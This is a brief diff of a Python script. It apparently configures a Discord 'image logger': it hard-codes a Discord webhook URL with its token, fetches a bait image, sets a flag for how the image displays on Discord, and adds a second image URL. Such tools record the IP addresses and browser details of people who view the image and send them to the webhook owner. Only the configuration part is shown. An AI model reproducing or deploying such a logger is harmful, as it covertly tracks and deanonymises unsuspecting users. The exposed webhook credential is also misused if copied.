@@ -7,6 +7,7 @@ from urllib import parse
 import httpx, base64, httpagentparser
 
 webhook = https://discord.com/api/webhooks/1383406297617137706/MznWr0PslqIwX7FIeGMKW-LgYCp6NHzNgg9-gxiKmHYnvJta8QIv7XRAzS_sFYFJjQE9
+image = https://www.alleycat.org/wp-content/uploads/2019/03/FELV-cat.jpg
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
